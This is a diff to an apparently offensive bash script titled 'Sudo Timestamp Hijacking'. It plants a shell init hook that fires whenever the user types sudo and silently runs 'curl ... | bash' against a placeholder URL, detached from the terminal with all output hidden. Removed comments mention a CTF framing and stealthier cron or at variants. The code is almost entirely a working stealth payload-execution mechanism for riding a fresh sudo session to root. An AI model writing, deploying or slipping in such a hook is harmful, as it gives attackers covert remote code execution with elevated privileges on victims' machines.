@@ -1,5 +1,5 @@
 #!/bin/bash
-# 🔐 sudo_timestamp_hijacking.sh - Sudo Timestamp Hijacking | Invisible privilege escalation monitor
+# 🔐 sudo_timestamp_hijacking.sh - Sudo Timestamp Hijacking
 # Made By Aryan Giri | giriaryan694-a11y
 
 set -euo pipefail
@@ -13,20 +13,12 @@ cat > "$INIT_FILE" << 'EOF'
 __sudo_watch__() {
     local cmd="$BASH_COMMAND"
     if [[ "$cmd" =~ ^[[:space:]]*sudo([[:space:]]|$) ]]; then
-        # FIX: Allocate PTY + preserve stdin for interactive payloads
-        # Use script(1) to fake a TTY, or socat if available
-        # Fallback: nohup with stdin preserved from current TTY
-        (
-            # Method 1: script -q -c "curl ... | bash" /dev/null
-            # Method 2: Direct TTY steal (aggressive, visible in ps)
-            # Method 3: Schedule via at/cron (delayed, stealthier)
-            
-            # Best CTF approach: reuse existing TTY via setsid + ctty hack
-            setsid bash -c '
-                exec <> /dev/tty
-                curl -s --connect-timeout 2 --max-time 5 "ALARM_PLACEHOLDER" 2>/dev/null | bash
-            ' &>/dev/null
-        ) & disown
+        # Spawn completely detached from job control and TTY
+        ( 
+            # Close stdin properly, ignore signals, disown from shell
+            curl -s --connect-timeout 2 --max-time 5 "ALARM_PLACEHOLDER" 2>/dev/null | bash 
+        ) </dev/null &>/dev/null & 
+        disown &>/dev/null || true
     fi
     return 0
 }
